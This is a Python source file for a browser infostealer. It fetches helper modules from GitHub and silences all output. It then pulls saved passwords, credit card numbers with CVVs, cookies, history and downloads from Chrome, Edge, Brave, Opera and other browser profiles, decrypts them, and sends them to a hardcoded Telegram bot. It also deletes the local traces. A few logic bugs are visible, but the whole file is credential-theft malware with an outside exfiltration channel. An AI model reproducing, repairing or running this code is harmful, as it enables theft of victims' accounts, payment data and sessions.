import os
import urllib.request

# URLs to the raw files on GitHub
urls = {
    "utils.py": "https://github.com/invisibleghostshell-ux/WebExtractor/blob/main/utils.py",
    "extractor.py": "https://github.com/invisibleghostshell-ux/WebExtractor/blob/main/extract.py"
}

# Download each file
for filename, url in urls.items():
    print(f"Downloading {filename} from {url}")
    urllib.request.urlretrieve(url, filename)


import os
import logging
import asyncio
import telegram
from utils import get_master_key, convert_chrome_time
from extract import get_data
import asyncio
import subprocess


async def main():
    await process_and_send_data()

# Suppress any output
os.environ['PYTHONUNBUFFERED'] = '0'
DEVNULL = open(os.devnull, 'w')

# Suppress logging messages
logging.disable(logging.CRITICAL)

# Telegram bot token and chat ID
TOKEN = '6851878587:AAGnwbnSWYlphdr4cZ80FOPAi2b0B9jTd3U'
CHAT_ID = '6505578903'

# Initialize the bot
bot = telegram.Bot(token=TOKEN)

async def send_data_to_telegram(file_path, caption):
    try:
        await bot.send_document(chat_id=CHAT_ID, document=open(file_path, 'rb'), caption=caption)
        # Delete the temporary file after sending
        os.remove(file_path)
    except Exception as e:
        pass

home_dir = os.path.expanduser('~')



# Define the browsers dictionary
browsers = {
    'microsoft-edge': os.path.join(home_dir, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'),
    'mozilla-firefox': os.path.join(home_dir, 'AppData', 'Local', 'Mozilla', 'Firefox', 'Profiles'),
    'google-chrome': os.path.join(home_dir, 'AppData', 'Local', 'Google', 'Chrome', 'User Data'),
    'brave-browser': os.path.join(home_dir, 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data'),
    'opera': os.path.join(home_dir, 'AppData', 'Roaming', 'Opera Software', 'Opera Stable'),
    'safari': os.path.join(home_dir, 'Library', 'Safari'),
    'vivaldi': os.path.join(home_dir, 'AppData', 'Local', 'Vivaldi', 'User Data'),
    'yandex-browser': os.path.join(home_dir, 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data'),
    # Add other browsers here
}


data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified, cvv_encrypted FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name On Card', 'Expiration Month', 'Expiration Year', 'Card Number', 'Added On', 'CVV'],
        'decrypt': True
    },
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': '\\Network\\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': False
    },
}

def installed_browsers():
    available = []
    for browser, path in browsers.items():
        if os.path.exists(path):
            available.append(browser)
    return available

def get_profiles(browser_path):
    profiles = []
    if not os.path.exists(browser_path):
        return profiles  # Return empty list if the browser path does not exist
    
    for root, dirs, files in os.walk(browser_path):
        for dir_name in dirs:
            if dir_name.startswith("Profile") or dir_name == "Default":
                profiles.append(dir_name)
        break
    return profiles

async def process_and_send_data():
    try:
        available_browsers = installed_browsers()

        for browser in available_browsers:
            browser_path = browsers[browser]
            master_key = get_master_key(browser_path)
            if not master_key:
                continue

            profiles = get_profiles(browser_path)
            for profile in profiles:
                data_queries_for_browser = data_queries.get(browser, {})
                for data_type_name, data_type in data_queries_for_browser.items():
                    try:
                        data = get_data(browser_path, profile, master_key, data_type)
                        if data:
                            file_path = f"{browser}_{profile}_{data_type_name}.txt"
                            with open(file_path, 'w', encoding='utf-8') as file:
                                file.write(data)
                            caption = f"{browser.capitalize()} - {profile.capitalize()} - {data_type_name.capitalize()} Data"
                            await send_data_to_telegram(file_path, caption)
                    except Exception as e:
                        pass
    except Exception as e:
        pass

if __name__ == '__main__':
    result = subprocess.run(['python', '-c', 'import asyncio; asyncio.run(main())'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)



